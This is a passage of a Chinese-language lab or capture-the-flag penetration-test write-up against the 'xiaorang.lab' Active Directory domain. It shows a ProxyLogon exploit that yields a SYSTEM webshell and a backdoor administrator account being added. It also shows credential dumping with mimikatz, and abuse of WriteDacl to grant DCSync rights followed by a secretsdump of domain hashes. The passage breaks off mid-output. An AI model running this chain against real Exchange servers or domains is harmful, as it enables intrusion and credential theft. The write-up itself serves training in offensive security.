class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span>      XIAORANG-EXC01.xiaorang.lab         Windows Server <span class="hljs-number">2016</span> <br></code></pre></td></tr></table></figure><p>并且还发现 172.22.3.9 这台机器有 Outlook</p><h1 id="Microsoft-Exchange-Proxylogon-利用"><a href="#Microsoft-Exchange-Proxylogon-利用" class="headerlink" title="Microsoft Exchange Proxylogon 利用"></a>Microsoft Exchange Proxylogon 利用</h1><p><img src="https://img.dkdun.cn/v1/2025/12/44a79ef8b7000ea8.png"></p><p>Exchange 邮箱，需要账户密码登录，尝试 ProxyLogon 拿 shell 写后门账户</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# proxychains -q python2 proxylogon.py <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">9</span> administrator@xiaorang.lab<br><br>  _____                     _<br> |  __ \                   | |<br> | |__) | __ _____  ___   _| |     ___   __ _  ___  _ __<br> |  ___/ &#x27;__/ _ \ \/ / | | | |    / _ \ / _` |/ _ \| &#x27;_ \<br> | |   | | | (_) &gt;  &lt;| |_| | |___| (_) | (_| | (_) | | | |<br> |_|   |_|  \___/_/\_ \__, |______\___/ \__, |\___/|_| |_|<br>                       __/ |             __/ |<br>                      |___/             |___/<br><br>Original PoC by https://github.com/testanull<br><span class="hljs-function">Author: @<span class="hljs-title">Haus3c</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Target</span>: 172.22.3.9</span><br><span class="hljs-function">=============================</span><br><span class="hljs-function">[+] <span class="hljs-title">Attempting</span> <span class="hljs-title">SSRF</span></span><br><span class="hljs-function"><span class="hljs-title">DN</span>: /<span class="hljs-title">o</span>=<span class="hljs-title">XIAORANG</span> <span class="hljs-title">LAB</span>/<span class="hljs-title">ou</span>=<span class="hljs-title">Exchange</span> <span class="hljs-title">Administrative</span> <span class="hljs-title">Group</span> (<span class="hljs-title">FYDIBOHF23SPDLT</span>)/<span class="hljs-title">cn</span>=<span class="hljs-title">Recipients</span>/<span class="hljs-title">cn</span>=8<span class="hljs-title">ca6ff254802459d9f63ee916eabb487</span>-<span class="hljs-title">Administrat</span></span><br><span class="hljs-function"><span class="hljs-title">SID</span>: <span class="hljs-title">S</span>-1-5-21-533686307-2117412543-4200729784-500</span><br><span class="hljs-function">[+] <span class="hljs-title">SSRF</span> <span class="hljs-title">Successful</span>!</span><br><span class="hljs-function">[+] <span class="hljs-title">Attempting</span> <span class="hljs-title">Arbitrary</span> <span class="hljs-title">File</span> <span class="hljs-title">Write</span></span><br><span class="hljs-function"><span class="hljs-title">SessionID</span>: 23<span class="hljs-title">b19d1f</span>-<span class="hljs-title">c638</span>-4<span class="hljs-title">d75</span>-83<span class="hljs-title">d0</span>-74<span class="hljs-title">d85b8d356d</span></span><br><span class="hljs-function"><span class="hljs-title">CanaryToken</span>: <span class="hljs-title">GkMzES3LNUi6llExSnZZ6_LKm</span>-<span class="hljs-title">x5790IJH9pqaX_2gYs0WxfcWZBqRKicw80OlhHtZ9z4N1IQMI</span>.</span><br><span class="hljs-function"><span class="hljs-title">OABId</span>: 6<span class="hljs-title">d8fb74b</span>-8477-43<span class="hljs-title">ee</span>-83<span class="hljs-title">ba</span>-0<span class="hljs-title">b119205e85f</span></span><br><span class="hljs-function">[+] <span class="hljs-title">Success</span>! <span class="hljs-title">Entering</span> <span class="hljs-title">webshell</span>. <span class="hljs-title">Type</span> &#x27;<span class="hljs-title">quit</span>&#x27; <span class="hljs-title">or</span> &#x27;<span class="hljs-title">exit</span>&#x27; <span class="hljs-title">to</span> <span class="hljs-title">escape</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"># <span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">nt</span> <span class="hljs-title">authority</span>\<span class="hljs-title">system</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"># <span class="hljs-title">net</span> <span class="hljs-title">user</span> <span class="hljs-title">butt3rf1y</span> <span class="hljs-title">butt3r_f1y</span>! /<span class="hljs-title">add</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"># <span class="hljs-title">net</span> <span class="hljs-title">localgroup</span> <span class="hljs-title">administrators</span> <span class="hljs-title">butt3rf1y</span> /<span class="hljs-title">add</span></span><br></code></pre></td></tr></table></figure><p>rdp 登进去拿 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/b8c00cb4a45bbef0.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag02</span>: flag&#123;<span class="hljs-number">70</span>a3a53a-dc66-<span class="hljs-number">45</span>bb-a7d0-<span class="hljs-number">75</span>edf74d006d&#125;<br></code></pre></td></tr></table></figure><h1 id="通过-WirteDacl-权限打-DCSync"><a href="#通过-WirteDacl-权限打-DCSync" class="headerlink" title="通过 WirteDacl 权限打 DCSync"></a>通过 WirteDacl 权限打 DCSync</h1><p>查看任务管理器发现还有另一个用户在线</p><p><img src="https://img.dkdun.cn/v1/2025/12/4725e10409efd551.png"></p><p>用 minikataz 抓一下用户 hash，抓到域内 Zhangtong 和 XIAORANG-EXC01$ 机器用户的哈希</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">2025799</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">001</span>ee947)<br>Session           : RemoteInteractive from <span class="hljs-number">2</span><br>User Name         : Zhangtong<br>Domain            : XIAORANG<br>Logon Server      : XIAORANG-WIN16<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">9</span>/<span class="hljs-number">7</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">28</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">533686307</span>-<span class="hljs-number">2117412543</span>-<span class="hljs-number">4200729784</span>-<span class="hljs-number">1147</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : Zhangtong<br>         * Domain   : XIAORANG<br>         * NTLM     : <span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4<br>         * SHA1     : <span class="hljs-number">4</span>d205f752e28b0a13e7a2da2a956d46cb9d9e01e<br>         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b<br>        tspkg :<br>        wdigest :<br>         * Username : Zhangtong<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : Zhangtong<br>         * Domain   : XIAORANG.LAB<br>         * Password : (null)<br>        ssp :<br>        credman :<br>        <br>Authentication Id : <span class="hljs-number">0</span> ; <span class="hljs-number">1867480</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">001</span>c7ed8)<br>Session           : Interactive from <span class="hljs-number">2</span><br>User Name         : DWM-<span class="hljs-number">2</span><br>Domain            : Window Manager<br>Logon Server      : (null)<br>Logon <span class="hljs-built_in">Time</span>        : <span class="hljs-number">2025</span>/<span class="hljs-number">9</span>/<span class="hljs-number">7</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">22</span><br>SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">90</span>-<span class="hljs-number">0</span>-<span class="hljs-number">2</span><br>        msv :<br>         [<span class="hljs-number">00000003</span>] Primary<br>         * Username : XIAORANG-EXC01$<br>         * Domain   : XIAORANG<br>         * NTLM     : bc2aaa56d33a9080b44fbe2d44b520b5<br>         * SHA1     : <span class="hljs-number">67</span>ae100419abf0f216f927571cb12ee55c209132<br>        tspkg :<br>        wdigest :<br>         * Username : XIAORANG-EXC01$<br>         * Domain   : XIAORANG<br>         * Password : (null)<br>        kerberos :<br>         * Username : XIAORANG-EXC01$<br>         * Domain   : xiaorang.lab<br>         * Password : b5 <span class="hljs-number">92</span> <span class="hljs-number">7</span>e <span class="hljs-number">8</span>c bd <span class="hljs-number">05</span> <span class="hljs-number">90</span> <span class="hljs-number">45</span> <span class="hljs-number">5</span>d c3 d4 ee <span class="hljs-number">2</span>f bf a3 <span class="hljs-number">04</span> <span class="hljs-number">65</span> <span class="hljs-number">8</span>b <span class="hljs-number">06</span> f6 b5 <span class="hljs-number">48</span> <span class="hljs-number">52</span> <span class="hljs-number">7</span>f a9 <span class="hljs-number">33</span> <span class="hljs-number">12</span> <span class="hljs-number">87</span> a8 f5 <span class="hljs-number">94</span> <span class="hljs-number">38</span> <span class="hljs-number">90</span> <span class="hljs-number">13</span> b1 <span class="hljs-number">5</span>d ab f0 <span class="hljs-number">73</span> <span class="hljs-number">63</span> <span class="hljs-number">81</span> <span class="hljs-number">79</span> <span class="hljs-number">8</span>e <span class="hljs-number">7</span>d d9 <span class="hljs-number">08</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>d ba <span class="hljs-number">7</span>f f8 b9 a5 <span class="hljs-number">97</span> <span class="hljs-number">23</span> <span class="hljs-number">97</span> <span class="hljs-number">3</span>c <span class="hljs-number">9</span>c <span class="hljs-number">1</span>d b0 a8 <span class="hljs-number">89</span> b7 <span class="hljs-number">48</span> ba <span class="hljs-number">52</span> <span class="hljs-number">10</span> <span class="hljs-number">1</span>d e7 <span class="hljs-number">80</span> cb a4 fd <span class="hljs-number">9</span>e <span class="hljs-number">2</span>a db <span class="hljs-number">5</span>a <span class="hljs-built_in">cd</span> <span class="hljs-number">40</span> ae <span class="hljs-number">2</span>a c7 <span class="hljs-number">5</span>d <span class="hljs-number">00</span> fb <span class="hljs-number">6</span>d c5 <span class="hljs-number">41</span> a0 a7 <span class="hljs-number">17</span> c3 <span class="hljs-number">4</span>c <span class="hljs-number">5</span>f e4 <span class="hljs-number">3</span>e f0 <span class="hljs-number">5</span>a <span class="hljs-number">10</span> a9 <span class="hljs-number">8</span>e f0 <span class="hljs-number">97</span> <span class="hljs-number">24</span> f9 <span class="hljs-number">69</span> <span class="hljs-number">56</span> bf ed <span class="hljs-number">2</span>b <span class="hljs-number">54</span> <span class="hljs-number">34</span> <span class="hljs-number">5</span>b <span class="hljs-number">65</span> <span class="hljs-number">6</span>d af <span class="hljs-number">96</span> <span class="hljs-number">15</span> cb <span class="hljs-number">4</span>d b9 <span class="hljs-number">6</span>a b9 <span class="hljs-number">5</span>b <span class="hljs-number">42</span> <span class="hljs-number">2</span>e a3 <span class="hljs-number">7</span>d df e6 <span class="hljs-number">1</span>c <span class="hljs-number">9</span>b <span class="hljs-number">28</span> ca <span class="hljs-number">04</span> <span class="hljs-number">82</span> <span class="hljs-number">4</span>a <span class="hljs-number">80</span> f2 <span class="hljs-number">5</span>d a9 <span class="hljs-number">72</span> <span class="hljs-number">2</span>b <span class="hljs-number">6</span>f e0 <span class="hljs-number">21</span> f7 c0 d8 <span class="hljs-number">11</span> <span class="hljs-number">8</span>f f0 <span class="hljs-number">6</span>d <span class="hljs-number">15</span> <span class="hljs-number">98</span> <span class="hljs-number">10</span> <span class="hljs-number">48</span> d6 <span class="hljs-number">6</span>c f8 e7 e9 <span class="hljs-number">92</span> <span class="hljs-number">36</span> <span class="hljs-number">9</span>e <span class="hljs-number">1</span>e <span class="hljs-number">9</span>c e2 e7 dc a5 f4 fe a8 ed <span class="hljs-number">4</span>b <span class="hljs-number">1</span>d <span class="hljs-number">7</span>a <span class="hljs-number">5</span>d <span class="hljs-number">8</span>f <span class="hljs-number">55</span> f5 <span class="hljs-number">1</span>e <span class="hljs-number">45</span> <span class="hljs-number">58</span> ce <span class="hljs-number">30</span> cc <span class="hljs-number">09</span> <span class="hljs-number">49</span> b3 b8 <span class="hljs-number">09</span> b8 <span class="hljs-number">3</span>a fe <span class="hljs-number">27</span> <span class="hljs-number">1</span>f <span class="hljs-number">10</span> <span class="hljs-number">74</span> <span class="hljs-number">7</span>d <span class="hljs-number">4</span>e <span class="hljs-number">73</span> c4 af db <span class="hljs-number">39</span> <span class="hljs-number">94</span> a5 c6 <span class="hljs-number">2</span>b e3 <span class="hljs-number">22</span> <span class="hljs-number">2</span>f <span class="hljs-number">04</span> b7 <span class="hljs-number">9</span>b <span class="hljs-number">75</span> f0 <span class="hljs-number">72</span> ac b5 <span class="hljs-number">6</span>f <span class="hljs-number">21</span> d0 <span class="hljs-number">3</span>c cb <span class="hljs-number">82</span> <span class="hljs-number">0</span>f <span class="hljs-number">49</span> <span class="hljs-number">76</span> c4 <span class="hljs-number">83</span> bf df db <span class="hljs-number">0</span>f <span class="hljs-number">3</span>f <span class="hljs-number">2</span>e <span class="hljs-number">57</span><br>        ssp :<br>        credman :<br></code></pre></td></tr></table></figure><p>dump 域信息分析</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">proxychains -q bloodhound-python -d xiaorang.lab -u &#x27;Zhangtong&#x27; --hashes <span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4:<span class="hljs-number">22</span>c7f81993e96ac83ac2f3f1903de8b4 -dc XIAORANG-WIN16.xiaorang.lab -c all -ns <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> --zip --dns-tcp<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/b356b2bbdac01ec4.png"></p><p>发现 web 的机器用户有 WirteDacl 权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf18f4bb6fb1db28.png"></p><p>那么打 DCsync</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# proxychains -q impacket-dacledit &#x27;XIAORANG.LAB&#x27;/&#x27;XIAORANG-EXC01$&#x27; -hashes bc2aaa56d33a9080b44fbe2d44b520b5:bc2aaa56d33a9080b44fbe2d44b520b5 -action write -rights DCSync -principal &#x27;XIAORANG-EXC01$&#x27; -target-dn &quot;DC=xiaorang,DC=lab&quot; -dc-ip <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">101</span>: SyntaxWarning: invalid escape sequence &#x27;\V&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">83</span>-<span class="hljs-number">0</span>&#x27;: &#x27;NT VIRTUAL MACHINE\Virtual Machines&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">110</span>: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span>&#x27;: &#x27;BUILTIN\Pre-Windows <span class="hljs-number">2000</span> Compatible Access&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">111</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">555</span>&#x27;: &#x27;BUILTIN\Remote Desktop Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">112</span>: SyntaxWarning: invalid escape sequence &#x27;\I&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">557</span>&#x27;: &#x27;BUILTIN\Incoming Forest Trust Builders&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">114</span>: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">558</span>&#x27;: &#x27;BUILTIN\Performance Monitor Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">115</span>: SyntaxWarning: invalid escape sequence &#x27;\P&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">559</span>&#x27;: &#x27;BUILTIN\Performance Log Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">116</span>: SyntaxWarning: invalid escape sequence &#x27;\W&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">560</span>&#x27;: &#x27;BUILTIN\Windows Authorization Access Group&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">117</span>: SyntaxWarning: invalid escape sequence &#x27;\T&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">561</span>&#x27;: &#x27;BUILTIN\Terminal Server License Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">118</span>: SyntaxWarning: invalid escape sequence &#x27;\D&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">562</span>&#x27;: &#x27;BUILTIN\Distributed COM Users&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">119</span>: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">569</span>&#x27;: &#x27;BUILTIN\Cryptographic Operators&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">120</span>: SyntaxWarning: invalid escape sequence &#x27;\E&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">573</span>&#x27;: &#x27;BUILTIN\Event Log Readers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">121</span>: SyntaxWarning: invalid escape sequence &#x27;\C&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">574</span>&#x27;: &#x27;BUILTIN\Certificate Service DCOM Access&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">122</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">575</span>&#x27;: &#x27;BUILTIN\RDS Remote Access Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">123</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">576</span>&#x27;: &#x27;BUILTIN\RDS Endpoint Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">124</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">577</span>&#x27;: &#x27;BUILTIN\RDS Management Servers&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">125</span>: SyntaxWarning: invalid escape sequence &#x27;\H&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">578</span>&#x27;: &#x27;BUILTIN\Hyper-V Administrators&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">126</span>: SyntaxWarning: invalid escape sequence &#x27;\A&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">579</span>&#x27;: &#x27;BUILTIN\Access Control Assistance Operators&#x27;,<br>/usr/share/doc/python3-impacket/examples/dacledit.py:<span class="hljs-number">127</span>: SyntaxWarning: invalid escape sequence &#x27;\R&#x27;<br>  &#x27;S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span>&#x27;: &#x27;BUILTIN\Remote Management Users&#x27;,<br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br>[*] DACL backed up to dacledit-<span class="hljs-number">20250907</span>-<span class="hljs-number">171134</span>.bak<br>[*] DACL modified successfully!<br></code></pre></td></tr></table></figure><p>然后直接 dump 下来域内所有哈希</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# proxychains -q impacket-secretsdump &#x27;XIAORANG.LAB&#x27;/&#x27;XIAORANG-EXC01$&#x27;@<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -hashes bc2aaa56d33a9080b44fbe2d44b520b5:bc2aaa56d33a9080b44fbe2d44b520b5<br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: <span class="hljs-number">0</span>x5 - rpc_s_access_denied<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>xiaorang.lab\Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb:::<br><span class="hljs-function">Guest:501:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">krbtgt</span>:502:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647</span>:::</span><br><span class="hljs-function"><span class="hljs-title">DefaultAccount</span>:503:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\$431000-7<span class="hljs-title">AGO1IPPEUGJ</span>:1124:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_46bc0bcd781047eba</span>:1125:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_2554056e362e45ba9</span>:1126:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_ae8e35b0ca3e41718</span>:1127:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_341e33a8ba4d46c19</span>:1128:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_3d52038e2394452f8</span>:1129:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_2ddd7a0d26c84e7cb</span>:1130:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_015b052ab8324b3fa</span>:1131:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_9bd6f16aa25343e68</span>:1132:<span 